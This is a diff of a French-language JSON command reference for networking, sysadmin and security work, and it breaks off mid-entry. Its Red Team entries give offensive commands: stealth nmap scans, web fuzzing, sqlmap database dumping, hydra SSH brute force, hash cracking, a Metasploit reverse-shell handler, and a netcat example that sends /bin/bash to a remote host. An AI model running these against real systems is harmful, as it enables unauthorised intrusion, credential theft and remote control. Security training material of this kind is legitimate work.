@@ -1,173 +1,931 @@
 [
   {
+    "command": "ip link show",
+    "description": "Lister les interfaces reseau",
+    "category": "Reseau",
+    "detailedExplanation": "Affiche toutes les interfaces reseau du systeme avec leur etat (UP/DOWN), adresses MAC et MTU. Remplace ifconfig sur les distributions modernes.",
+    "options": ["-s : format court avec statistiques", "-br : format compact lisible"],
+    "examples": ["ip -br link show", "ip link set eth0 up"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "ip addr show",
+    "description": "Afficher les adresses IP des interfaces",
+    "category": "Reseau",
+    "detailedExplanation": "Liste toutes les adresses IPv4 et IPv6 assignees a chaque interface reseau, avec le masque de sous-reseau et le scope.",
+    "options": ["dev eth0 : filtrer par interface", "-4 : IPv4 uniquement", "-6 : IPv6 uniquement"],
+    "examples": ["ip -4 addr show eth0", "ip addr add 192.168.1.100/24 dev eth0"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "ip route show",
+    "description": "Afficher la table de routage",
+    "category": "Reseau",
+    "detailedExplanation": "Montre toutes les routes connues du systeme, incluant la passerelle par defaut (default via), les routes directes et les metriques. Le noyau selectionne la route la plus specifique (longest prefix match).",
+    "options": ["table main : table principale", "get [IP] : quelle route pour cette IP"],
+    "examples": ["ip route get 8.8.8.8", "ip route add 10.0.0.0/8 via 192.168.1.1"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "ip neigh show",
+    "description": "Afficher la table ARP (voisins reseau)",
+    "category": "Reseau",
+    "detailedExplanation": "Liste les correspondances IP/MAC des voisins reseau connus. Remplace la commande arp -a. Les etats possibles sont REACHABLE, STALE, DELAY, PROBE, FAILED.",
+    "examples": ["ip neigh show dev eth0", "ip neigh flush dev eth0"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "ss -tulnp",
+    "description": "Lister les ports en ecoute avec PID",
+    "category": "Reseau",
+    "detailedExplanation": "Affiche tous les sockets TCP/UDP en ecoute avec le processus associe. Plus rapide que netstat car interroge directement le noyau via netlink.",
+    "options": ["-t : TCP", "-u : UDP", "-l : LISTEN", "-n : numerique", "-p : PID/processus"],
+    "examples": ["ss -tlnp | grep :80", "ss -s"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "ss -antp state established",
+    "description": "Lister les connexions TCP etablies",
+    "category": "Reseau",
+    "detailedExplanation": "Filtre les sockets TCP pour n'afficher que les connexions actives (ESTABLISHED), utile pour voir qui est connecte au serveur.",
+    "examples": ["ss -antp state established | awk '{print $5}' | sort | uniq -c | sort -rn"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "ping -c 4 [host]",
+    "description": "Tester la connectivite ICMP",
+    "category": "Diagnostic",
+    "detailedExplanation": "Envoie 4 paquets ICMP Echo Request et mesure le temps d'aller-retour (RTT). Permet de verifier si un hote est joignable et de mesurer la latence.",
+    "options": ["-c N : nombre de paquets", "-i N : intervalle en secondes", "-W N : timeout", "-s N : taille du paquet"],
+    "examples": ["ping -c 10 -i 0.2 8.8.8.8", "ping -c 1 -W 2 192.168.1.1"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "traceroute [host]",
+    "description": "Tracer le chemin reseau vers un hote",
+    "category": "Diagnostic",
+    "detailedExplanation": "Affiche chaque routeur (hop) sur le chemin vers la destination en incrementant le TTL. Permet d'identifier ou se situe un probleme de routage ou de latence.",
+    "options": ["-n : pas de resolution DNS", "-T : utiliser TCP au lieu d'UDP", "-p PORT : port de destination"],
+    "examples": ["traceroute -n 8.8.8.8", "traceroute -T -p 443 google.com"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "mtr --report [host]",
+    "description": "Rapport combine Ping + Traceroute",
+    "category": "Diagnostic",
+    "detailedExplanation": "Combine traceroute et ping en temps reel. Affiche la latence moyenne, le jitter et le pourcentage de perte pour chaque hop. Le mode --report envoie 10 paquets et genere un rapport.",
+    "examples": ["mtr --report --report-cycles 20 8.8.8.8", "mtr -n google.com"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "dig [domain]",
+    "description": "Interroger un serveur DNS",
+    "category": "DNS",
+    "detailedExplanation": "Effectue une requete DNS et affiche la reponse complete : section ANSWER (records), AUTHORITY (serveurs autoritaires), ADDITIONAL, ainsi que les statistiques (temps de requete, serveur utilise).",
+    "options": ["+short : reponse courte", "+trace : resolution iterative complete", "@8.8.8.8 : serveur DNS specifique", "ANY : tous les types de records"],
+    "examples": ["dig +short google.com", "dig @1.1.1.1 +trace example.com", "dig MX gmail.com"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "dig +trace [domain]",
+    "description": "Suivre la resolution DNS etape par etape",
+    "category": "DNS",
+    "detailedExplanation": "Parcourt toute la hierarchie DNS depuis les serveurs root (.), puis TLD (.com), puis le serveur autoritaire du domaine. Permet de voir exactement comment un nom est resolu et d'identifier les problemes de delegation.",
+    "examples": ["dig +trace example.com", "dig +trace +nodnssec google.com"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "nslookup [domain]",
+    "description": "Resolution DNS simple",
+    "category": "DNS",
+    "detailedExplanation": "Outil basique de resolution DNS. Moins puissant que dig mais disponible partout (Windows/Linux/macOS). Utile pour des verifications rapides.",
+    "examples": ["nslookup google.com", "nslookup -type=MX gmail.com 8.8.8.8"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "host [domain]",
+    "description": "Resolution DNS concise",
+    "category": "DNS",
+    "detailedExplanation": "Version simplifiee de dig qui affiche directement les records A, AAAA et MX. Ideal pour des verifications rapides en script.",
+    "examples": ["host google.com", "host -t AAAA google.com"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "whois [domain]",
+    "description": "Informations d'enregistrement du domaine",
+    "category": "DNS",
+    "detailedExplanation": "Interroge la base WHOIS pour obtenir le proprietaire du domaine, les dates de creation/expiration, les serveurs DNS autoritaires et le registrar.",
+    "examples": ["whois google.com", "whois 8.8.8.8"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "curl -I [URL]",
+    "description": "Afficher les en-tetes HTTP",
+    "category": "Web",
+    "detailedExplanation": "Envoie une requete HEAD et affiche uniquement les en-tetes de reponse : code HTTP, Content-Type, Server, headers de securite (HSTS, CSP, X-Frame-Options).",
+    "options": ["-I : HEAD only", "-v : verbose", "-L : suivre redirections", "-k : ignorer certificat SSL"],
+    "examples": ["curl -I https://google.com", "curl -IL https://example.com"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "curl -o /dev/null -w '%{time_total}' [URL]",
+    "description": "Mesurer le temps de reponse HTTP",
+    "category": "Web",
+    "detailedExplanation": "Telecharge une page sans l'afficher et affiche uniquement les metriques de temps : resolution DNS, connexion TCP, handshake TLS, premier octet (TTFB), total.",
+    "options": ["%{time_namelookup} : DNS", "%{time_connect} : TCP", "%{time_appconnect} : TLS", "%{time_starttransfer} : TTFB"],
+    "examples": ["curl -o /dev/null -s -w 'DNS: %{time_namelookup}s\\nTCP: %{time_connect}s\\nTLS: %{time_appconnect}s\\nTTFB: %{time_starttransfer}s\\nTotal: %{time_total}s\\n' https://google.com"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "wget -r -np -k [URL]",
+    "description": "Telecharger un site web complet",
+    "category": "Web",
+    "detailedExplanation": "Telecharge recursivement toutes les pages d'un site en convertissant les liens pour une consultation hors-ligne.",
+    "options": ["-r : recursif", "-np : ne pas remonter au parent", "-k : convertir les liens", "-l N : profondeur max"],
+    "examples": ["wget -r -np -k -l 2 https://example.com"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "openssl s_client -connect [host]:443",
+    "description": "Inspecter un certificat TLS",
+    "category": "Web",
+    "detailedExplanation": "Etablit une connexion TLS et affiche la chaine de certificats complete, le protocole negocie (TLS 1.2/1.3), les algorithmes de chiffrement et les dates de validite.",
+    "options": ["-showcerts : affiche tous les certificats", "-servername [host] : SNI"],
+    "examples": ["openssl s_client -connect google.com:443 -servername google.com | openssl x509 -noout -dates"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "tcpdump -i [iface] -n",
+    "description": "Capturer le trafic reseau en temps reel",
+    "category": "Diagnostic",
+    "detailedExplanation": "Capture et affiche les paquets transitant par une interface reseau. Outil fondamental pour le debug reseau et l'analyse de protocoles.",
+    "options": ["-i any : toutes les interfaces", "-n : pas de resolution DNS", "-w file.pcap : sauvegarder", "-c N : limiter a N paquets", "port 80 : filtrer par port"],
+    "examples": ["tcpdump -i eth0 -n port 443", "tcpdump -i any icmp -c 10", "tcpdump -w capture.pcap -i eth0 host 192.168.1.1"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "tcpdump -r [file.pcap]",
+    "description": "Lire une capture reseau sauvegardee",
+    "category": "Diagnostic",
+    "detailedExplanation": "Lit et analyse un fichier de capture au format pcap. Permet d'appliquer des filtres apres coup pour isoler le trafic pertinent.",
+    "examples": ["tcpdump -r capture.pcap 'tcp port 80'", "tcpdump -r capture.pcap -A | grep 'GET\\|POST'"],
+    "dangerLevel": 1
+  },
+  {
     "command": "nmap -sS -A -T4 [IP]",
-    "description": "Scan furtif complet (Recon)",
+    "description": "Scan furtif complet avec detection OS",
     "category": "Red Team",
     "iconName": "bug_report",
     "colorHex": "EF4444",
-    "detailedExplanation": "Exécute un scan SYN furtif, détecte l'OS, les versions de services, et exécute les scripts par défaut en mode agressif (T4).",
-    "options": ["-sS : Stealth SYN scan", "-A : OS detection, version detection, script scanning"],
-    "examples": ["nmap -sS -A -T4 10.0.0.1"],
+    "detailedExplanation": "Execute un scan SYN furtif (demi-connexion TCP), detecte l'OS, les versions de services, et execute les scripts NSE par defaut en mode agressif (T4). Le scan SYN est plus discret qu'un scan connect() complet.",
+    "options": ["-sS : SYN scan (stealth)", "-A : OS + versions + scripts + traceroute", "-T4 : timing agressif", "-p- : tous les 65535 ports"],
+    "examples": ["nmap -sS -A -T4 10.0.0.1", "nmap -sS -p 1-1000 -oN scan.txt 192.168.1.0/24"],
+    "dangerLevel": 3
+  },
+  {
+    "command": "nmap -sV -sC [IP]",
+    "description": "Detection de versions et scripts par defaut",
+    "category": "Red Team",
+    "colorHex": "EF4444",
+    "detailedExplanation": "Identifie les versions exactes des services (Apache 2.4.51, OpenSSH 8.9p1...) et execute les scripts NSE par defaut pour detecter des vulnerabilites connues.",
+    "options": ["-sV : detection de version", "-sC : scripts par defaut", "--script=vuln : scripts de vulnerabilite"],
+    "examples": ["nmap -sV -sC -p 22,80,443 10.0.0.1", "nmap --script=vuln 10.0.0.1"],
+    "dangerLevel": 3
+  },
+  {
+    "command": "nmap -Pn -F [IP]",
+    "description": "Scan rapide sans ping initial",
+    "category": "Red Team",
+    "colorHex": "EF4444",
+    "detailedExplanation": "Scanne les 100 ports les plus courants sans envoyer de ping prealable. Utile quand le firewall bloque ICMP mais laisse passer le trafic TCP.",
+    "examples": ["nmap -Pn -F 10.0.0.1", "nmap -Pn -sT -p 80,443 10.0.0.1"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "nmap -sn 192.168.1.0/24",
+    "description": "Decouverte d'hotes sur le reseau local",
+    "category": "Red Team",
+    "colorHex": "F97316",
+    "detailedExplanation": "Scan de decouverte (ping sweep) qui identifie les machines actives sur un sous-reseau sans scanner les ports. Utilise ARP en local, ICMP + TCP SYN/ACK en distant.",
+    "examples": ["nmap -sn 192.168.1.0/24", "nmap -sn -oG alive.txt 10.0.0.0/24"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "gobuster dir -u [URL] -w [wordlist]",
+    "description": "Brute-force de repertoires web",
+    "category": "Red Team",
+    "colorHex": "F97316",
+    "detailedExplanation": "Tente de decouvrir des repertoires et fichiers caches sur un serveur web en testant une liste de noms communs. Plus rapide que dirb/dirbuster grace au Go.",
+    "options": ["-u : URL cible", "-w : wordlist", "-t N : threads", "-x : extensions a tester", "-s : codes HTTP a accepter"],
+    "examples": ["gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,bak"],
+    "dangerLevel": 3
+  },
+  {
+    "command": "ffuf -u [URL]/FUZZ -w [wordlist]",
+    "description": "Fuzzing web ultra-rapide",
+    "category": "Red Team",
+    "colorHex": "F97316",
+    "detailedExplanation": "Fuzzer web ecrit en Go, extremement rapide. Remplace le mot FUZZ dans l'URL, les headers ou le body par chaque mot de la wordlist. Supporte le filtrage par taille, code HTTP, nombre de mots.",
+    "options": ["-mc 200,301 : codes a garder", "-fs N : filtrer par taille", "-H : header custom"],
+    "examples": ["ffuf -u https://example.com/FUZZ -w common.txt -mc 200 -t 100"],
     "dangerLevel": 3
   },
   {
     "command": "sqlmap -u \"[URL]\" --dbs --random-agent",
-    "description": "Exploitation SQLi",
+    "description": "Detection et exploitation SQLi automatique",
     "category": "Red Team",
-    "iconName": "bug_report",
     "colorHex": "EF4444",
-    "detailedExplanation": "Détecte et exploite automatiquement les vulnérabilités d'injection SQL sur l'URL cible, en masquant l'User-Agent.",
+    "detailedExplanation": "Detecte et exploite automatiquement les vulnerabilites d'injection SQL. Teste tous les types (UNION, blind, time-based, error-based) et enumere les bases de donnees.",
+    "options": ["--dbs : lister les bases", "--tables : lister les tables", "--dump : extraire les donnees", "--random-agent : User-Agent aleatoire"],
+    "examples": ["sqlmap -u 'http://target.com/page?id=1' --dbs --random-agent --batch"],
     "dangerLevel": 3
   },
   {
-    "command": "msfconsole -x \"use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; run\"",
-    "description": "Lancer un listener Metasploit",
+    "command": "hydra -l [user] -P [wordlist] [target] ssh",
+    "description": "Brute-force d'authentification",
     "category": "Red Team",
-    "iconName": "bug_report",
     "colorHex": "DC2626",
-    "detailedExplanation": "Lance un listener Metasploit prêt à recevoir un reverse shell depuis une cible compromise.",
-    "options": ["set LHOST [IP] : adresse d'écoute", "set LPORT [PORT] : port d'écoute"],
-    "examples": ["msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; run\""],
+    "detailedExplanation": "Teste des combinaisons identifiant/mot de passe contre un service d'authentification (SSH, FTP, HTTP, MySQL...). Supporte plus de 50 protocoles.",
+    "options": ["-l : login fixe", "-L : fichier de logins", "-P : fichier de mots de passe", "-t N : threads", "-vV : verbose"],
+    "examples": ["hydra -l admin -P rockyou.txt 10.0.0.1 ssh -t 4"],
     "dangerLevel": 3
   },
   {
-    "command": "gobuster dir -u [URL] -w /usr/share/wordlists/dirb/common.txt",
-    "description": "Brute-force de répertoires web",
+    "command": "john --wordlist=[file] [hashes]",
+    "description": "Casser des mots de passe hashes",
     "category": "Red Team",
-    "iconName": "search",
-    "colorHex": "F97316",
-    "detailedExplanation": "Tente de découvrir des répertoires et fichiers cachés sur un serveur web en testant une liste de noms communs.",
-    "options": ["-u : URL cible", "-w : chemin vers la wordlist", "-t : nombre de threads"],
-    "examples": ["gobuster dir -u https://example.com -w /usr/share/wordlists/rockyou.txt -t 50"],
+    "colorHex": "DC2626",
+    "detailedExplanation": "John the Ripper teste des mots de passe contre des hashes (MD5, SHA, bcrypt, etc.). Supporte les regles de mutation (majuscules, chiffres, symboles) pour etendre la wordlist.",
+    "options": ["--wordlist : dictionnaire", "--rules : mutations", "--format : type de hash", "--show : afficher les mots de passe trouves"],
+    "examples": ["john --wordlist=rockyou.txt --format=raw-sha256 hashes.txt", "john --show hashes.txt"],
     "dangerLevel": 3
   },
   {
-    "command": "journalctl -p err..emerg --since \"1 hour ago\"",
-    "description": "Analyse Logs Critiques",
+    "command": "hashcat -m 0 -a 0 [hashes] [wordlist]",
+    "description": "Cracking GPU de hashes",
+    "category": "Red Team",
+    "colorHex": "DC2626",
+    "detailedExplanation": "Cracker de mots de passe utilisant le GPU pour une vitesse maximale. Supporte 300+ types de hashes. Le mode -m specifie le type de hash (0=MD5, 1000=NTLM, 3200=bcrypt...).",
+    "options": ["-m N : type de hash", "-a 0 : attaque dictionnaire", "-a 3 : brute-force", "--rules : mutations"],
+    "examples": ["hashcat -m 1000 -a 0 ntlm.txt rockyou.txt", "hashcat -m 0 -a 3 md5.txt '?a?a?a?a?a?a'"],
+    "dangerLevel": 3
+  },
+  {
+    "command": "msfconsole",
+    "description": "Framework d'exploitation Metasploit",
+    "category": "Red Team",
+    "colorHex": "DC2626",
+    "detailedExplanation": "Console interactive du framework Metasploit. Contient des milliers d'exploits, payloads, modules auxiliaires et post-exploitation. Incontournable en pentest.",
+    "options": ["use [module] : selectionner un module", "set [option] : configurer", "exploit/run : lancer", "search [terme] : chercher"],
+    "examples": ["msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; run'"],
+    "dangerLevel": 3
+  },
+  {
+    "command": "nikto -h [URL]",
+    "description": "Scanner de vulnerabilites web",
+    "category": "Red Team",
+    "colorHex": "F97316",
+    "detailedExplanation": "Scanne un serveur web pour detecter des fichiers dangereux, des configurations incorrectes, des versions obsoletes et des vulnerabilites connues (6000+ tests).",
+    "examples": ["nikto -h https://example.com", "nikto -h https://example.com -Tuning 4"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "enum4linux -a [IP]",
+    "description": "Enumeration de partages SMB/Windows",
+    "category": "Red Team",
+    "colorHex": "F97316",
+    "detailedExplanation": "Enumere les informations SMB d'une machine Windows ou Samba : partages, utilisateurs, groupes, politique de mots de passe, SID.",
+    "examples": ["enum4linux -a 10.0.0.1", "enum4linux -U -S 10.0.0.1"],
+    "dangerLevel": 2
+  },
+  {
+    "command": "nc -lvnp [port]",
+    "description": "Listener Netcat (reverse shell)",
+    "category": "Red Team",
+    "colorHex": "DC2626",
+    "detailedExplanation": "Lance un listener TCP qui attend une connexion entrante. Utilise pour recevoir un reverse shell depuis une machine compromise.",
+    "options": ["-l : listen", "-v : verbose", "-n : pas de DNS", "-p : port"],
+    "examples": ["nc -lvnp 4444", "nc -e /bin/bash 10.0.0.1 4444"],
+    "dangerLevel": 3
+  },
+  {
+    "command": "journalctl -p err..emerg --since '1 hour ago'",
+    "description": "Logs critiques de la derniere heure",
     "category": "Blue Team",
-    "iconName": "security",
     "colorHex": "3B82F6",
-    "detailedExplanation": "Affiche les erreurs système critiques de la dernière heure pour détecter une compromission en cours.",
+    "detailedExplanation": "Filtre les logs systemd pour n'afficher que les erreurs critiques recentes. Premier reflexe en reponse a incident pour identifier rapidement ce qui s'est passe.",
+    "options": ["-p : priorite (emerg/alert/crit/err/warning/notice/info/debug)", "--since : depuis quand", "-u : filtrer par service", "-f : suivre en temps reel"],
+    "examples": ["journalctl -p err --since '30 min ago'", "journalctl -u sshd -f", "journalctl --since '2024-01-01' --until '2024-01-02'"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "journalctl -u [service] -f",
+    "description": "Suivre les logs d'un service en temps reel",
+    "category": "Blue Team",
+    "colorHex": "3B82F6",
+    "detailedExplanation": "Affiche les logs d'un service systemd specifique et les suit en temps reel (comme tail -f). Essentiel pour debugger un service qui plante ou surveiller une activite suspecte.",
+    "examples": ["journalctl -u nginx -f", "journalctl -u sshd --since today"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "last -n 20",
+    "description": "Derniers 20 logins sur le systeme",
+    "category": "Blue Team",
+    "colorHex": "3B82F6",
+    "detailedExplanation": "Affiche les dernieres connexions utilisateur avec la date, l'heure, l'IP source et la duree. Lit le fichier /var/log/wtmp. Combine avec lastb pour les tentatives echouees.",
+    "examples": ["last -n 20", "lastb -n 50", "last -i | head -20"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "ss -antp | awk '{print $5}' | sort | uniq -c | sort -rn",
+    "description": "Compter les connexions par IP source",
+    "category": "Blue Team",
+    "colorHex": "3B82F6",
+    "detailedExplanation": "Compte le nombre de connexions TCP par adresse IP source pour identifier un potentiel DDoS, brute-force ou activite anormale. Les IP avec beaucoup de connexions sont suspectes.",
+    "examples": ["ss -antp | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20"],
     "dangerLevel": 1
   },
   {
     "command": "netstat -tulpen | grep LISTEN",
-    "description": "Audit ports d'écoute",
+    "description": "Audit des ports en ecoute",
     "category": "Blue Team",
-    "iconName": "network",
     "colorHex": "3B82F6",
-    "detailedExplanation": "Liste tous les ports en écoute avec le PID et l'utilisateur associé pour vérifier les portes dérobées.",
+    "detailedExplanation": "Liste tous les ports en ecoute avec le PID et l'utilisateur associe. Permet de detecter des backdoors ou services non autorises. Preferer ss -tulnp sur les systemes modernes.",
     "dangerLevel": 1
   },
   {
-    "command": "ss -antp | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n",
-    "description": "Détection dangereuse / DDoS",
+    "command": "find / -perm -4000 -type f 2>/dev/null",
+    "description": "Trouver les binaires SUID",
     "category": "Blue Team",
-    "iconName": "security",
-    "colorHex": "3B82F6",
-    "detailedExplanation": "Compte le nombre de connexions par adresse IP source pour identifier un potentiel déni de service (DDoS) ou bruteforce.",
+    "colorHex": "2563EB",
+    "detailedExplanation": "Liste tous les fichiers avec le bit SUID active. Ces binaires s'executent avec les privileges du proprietaire (souvent root), ce qui en fait des cibles d'escalade de privileges.",
+    "examples": ["find / -perm -4000 -type f 2>/dev/null", "find / -perm -2000 -type f 2>/dev/null"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "find / -writable -type f 2>/dev/null",
+    "description": "Trouver les fichiers modifiables par tous",
+    "category": "Blue Team",
+    "colorHex": "2563EB",
+    "detailedExplanation": "Identifie les fichiers world-writable qui pourraient etre modifies par un attaquant pour escalader ses privileges (scripts cron, fichiers de config, bibliotheques).",
+    "examples": ["find /etc -writable -type f 2>/dev/null", "find / -writable -not -path '/proc/*' -type f 2>/dev/null"],
     "dangerLevel": 1
   },
   {
     "command": "auditctl -w /etc/passwd -p wa -k passwd_changes",
-    "description": "Surveiller les modifs /etc/passwd",
+    "description": "Surveiller les modifications de /etc/passwd",
     "category": "Blue Team",
-    "iconName": "lock",
     "colorHex": "2563EB",
-    "detailedExplanation": "Place un audit sur le fichier /etc/passwd pour détecter toute tentative d'écriture ou d'accès. Toute modification sera journalisée dans auditd.",
-    "options": ["-w : chemin du fichier", "-p wa : surveille écriture+accès", "-k : tag de l'événement"],
-    "examples": ["auditctl -w /etc/shadow -p wa -k shadow_access"],
+    "detailedExplanation": "Place un audit kernel sur un fichier critique. Toute ecriture ou modification d'attribut sera enregistree dans le journal d'audit avec le tag 'passwd_changes'.",
+    "options": ["-w : fichier a surveiller", "-p wa : surveiller ecriture + attributs", "-k : tag pour filtrer"],
+    "examples": ["auditctl -w /etc/shadow -p wa -k shadow_access", "ausearch -k passwd_changes"],
     "dangerLevel": 2
   },
   {
-    "command": "Get-ADUser -Filter * -Properties PasswordLastSet, PasswordNeverExpires",
-    "description": "Audit mots de passe AD",
-    "category": "Admin Sys",
-    "iconName": "admin_panel_settings",
-    "colorHex": "8B5CF6",
-    "detailedExplanation": "Liste tous les utilisateurs Active Directory et vérifie si leurs mots de passe expirent, essentiel pour la conformité.",
+    "command": "chkrootkit",
+    "description": "Scanner de rootkits",
+    "category": "Blue Team",
+    "colorHex": "2563EB",
+    "detailedExplanation": "Verifie les signatures de rootkits connus, les binaires systeme modifies, les interfaces en mode promiscuous et les fichiers suspects dans /tmp.",
+    "examples": ["chkrootkit", "chkrootkit -q"],
     "dangerLevel": 1
   },
   {
-    "command": "rsync -avz --delete -e ssh /source/ user@remote:/backup/",
-    "description": "Backup sécurisé distant",
+    "command": "rkhunter --check",
+    "description": "Verifier l'integrite du systeme (rootkits)",
+    "category": "Blue Team",
+    "colorHex": "2563EB",
+    "detailedExplanation": "Rootkit Hunter verifie les binaires systeme contre des hashes connus, les permissions suspectes, les fichiers caches, les modules noyau charges et les ports en ecoute.",
+    "examples": ["rkhunter --check --skip-keypress", "rkhunter --update"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "fail2ban-client status sshd",
+    "description": "Voir les IP bannies par fail2ban",
+    "category": "Blue Team",
+    "colorHex": "3B82F6",
+    "detailedExplanation": "Affiche le nombre de tentatives bloquees et les IP actuellement bannies pour le jail SSH. Fail2ban analyse les logs et banni les IP apres N echecs.",
+    "examples": ["fail2ban-client status", "fail2ban-client set sshd unbanip 10.0.0.1"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "systemctl list-units --type=service --state=running",
+    "description": "Lister les services actifs",
     "category": "Admin Sys",
-    "iconName": "storage",
-    "colorHex": "8B5CF6",
-    "detailedExplanation": "Synchronise un dossier local vers un serveur distant via tunnel chiffré SSH, en supprimant les fichiers obsolètes.",
+    "detailedExplanation": "Affiche tous les services systemd en cours d'execution. Permet de verifier quels services tournent et d'identifier des services inattendus ou non autorises.",
+    "examples": ["systemctl list-units --type=service --state=running", "systemctl list-units --failed"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "systemctl status [service]",
+    "description": "Etat detaille d'un service",
+    "category": "Admin Sys",
+    "detailedExplanation": "Affiche l'etat d'un service (active/inactive/failed), son PID, l'utilisation memoire, et les dernieres lignes de logs. Premier reflexe pour debugger un service.",
+    "examples": ["systemctl status nginx", "systemctl status sshd"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "systemctl enable --now [service]",
+    "description": "Activer et demarrer un service",
+    "category": "Admin Sys",
+    "detailedExplanation": "Active le service au boot (enable) et le demarre immediatement (--now). Sans --now, il faudrait aussi faire systemctl start.",
+    "examples": ["systemctl enable --now nginx", "systemctl disable --now apache2"],
     "dangerLevel": 2
   },
   {
-    "command": "Get-EventLog -LogName Security -InstanceId 4625 -Newest 50",
-    "description": "Echecs d'auth Windows (EventID 4625)",
+    "command": "top",
+    "description": "Moniteur de processus en temps reel",
     "category": "Admin Sys",
-    "iconName": "admin_panel_settings",
-    "colorHex": "7C3AED",
-    "detailedExplanation": "Récupère les 50 derniers échecs de connexion Windows. Utile pour détecter un bruteforce ou des tentatives d'accès non autorisées.",
-    "options": ["InstanceId 4625 : LoginFailure", "Newest 50 : limite les résultats"],
-    "examples": ["Get-EventLog -LogName Security -InstanceId 4625 | Select TimeGenerated, Message"],
+    "detailedExplanation": "Affiche les processus en cours avec leur utilisation CPU, memoire, PID, utilisateur. Se rafraichit toutes les 3 secondes. Touches interactives : M (trier par memoire), P (par CPU), k (kill), q (quitter).",
+    "options": ["-u user : filtrer par utilisateur", "-p PID : surveiller un PID", "-n N : N iterations puis quitter"],
+    "examples": ["top -u www-data", "top -bn1 | head -20"],
     "dangerLevel": 1
   },
   {
-    "command": "aws s3api get-bucket-versioning --bucket [nom]",
-    "description": "Vérif Versioning S3",
+    "command": "htop",
+    "description": "Moniteur de processus interactif (ameliore)",
+    "category": "Admin Sys",
+    "detailedExplanation": "Version amelioree de top avec interface en couleurs, scrolling, filtrage, arbre de processus et actions directes (kill, nice, strace). Affiche les barres CPU/RAM/Swap.",
+    "dangerLevel": 1
+  },
+  {
+    "command": "ps aux --sort=-%cpu | head -20",
+    "description": "Top 20 processus par CPU",
+    "category": "Admin Sys",
+    "detailedExplanation": "Liste les 20 processus consommant le plus de CPU. Utile pour identifier un processus emballe ou un minage de cryptomonnaie non autorise.",
+    "examples": ["ps aux --sort=-%mem | head -20", "ps aux --sort=-rss | head -10"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "free -h",
+    "description": "Utilisation memoire du systeme",
+    "category": "Admin Sys",
+    "detailedExplanation": "Affiche la memoire totale, utilisee, libre, partagee, en cache/buffer et le swap. L'option -h affiche en format lisible (GB/MB). La colonne 'available' est la memoire reellement disponible.",
+    "examples": ["free -h", "free -h -s 5"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "df -h",
+    "description": "Espace disque par partition",
+    "category": "Admin Sys",
+    "detailedExplanation": "Affiche l'espace utilise et disponible pour chaque systeme de fichiers monte. -h pour format lisible. Surveiller les partitions a plus de 80%.",
+    "examples": ["df -h", "df -h -T", "df -i"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "du -sh [path]/*",
+    "description": "Taille des dossiers",
+    "category": "Admin Sys",
+    "detailedExplanation": "Calcule la taille de chaque sous-dossier. Indispensable pour trouver ce qui remplit un disque. -s pour le total, -h pour format lisible.",
+    "options": ["-s : total uniquement", "-h : format lisible", "--max-depth=1 : un seul niveau"],
+    "examples": ["du -sh /var/log/*", "du -sh /* 2>/dev/null | sort -rh | head -10"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "lsblk",
+    "description": "Lister les disques et partitions",
+    "category": "Admin Sys",
+    "detailedExplanation": "Affiche l'arborescence des disques, partitions et points de montage. Plus lisible que fdisk -l pour avoir une vue d'ensemble du stockage.",
+    "options": ["-f : afficher les filesystems et UUID", "-o : colonnes custom"],
+    "examples": ["lsblk -f", "lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,FSTYPE"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "iostat -xz 1",
+    "description": "Statistiques I/O disque en temps reel",
+    "category": "Admin Sys",
+    "detailedExplanation": "Affiche les statistiques detaillees d'I/O par disque : lectures/ecritures par seconde, latence, utilisation. Essentiel pour diagnostiquer les problemes de performances disque.",
+    "examples": ["iostat -xz 1 5", "iostat -d -p sda 1"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "lsof -i :[port]",
+    "description": "Quel processus utilise ce port ?",
+    "category": "Admin Sys",
+    "detailedExplanation": "Liste les processus ayant un fichier ou socket ouvert. Avec -i, filtre par port reseau. Indispensable pour savoir quel processus bloque un port.",
+    "options": ["-i :80 : port 80", "-u user : par utilisateur", "-p PID : par processus", "+D /path : fichiers dans un dossier"],
+    "examples": ["lsof -i :8080", "lsof -u www-data", "lsof +D /var/log"],
+    "dangerLevel": 1
+  },
+  {
+    "command": "strace -p [PID]",
+    "description": "Tracer les appels systeme d'un processus",
+    "category": "Admin Sys",
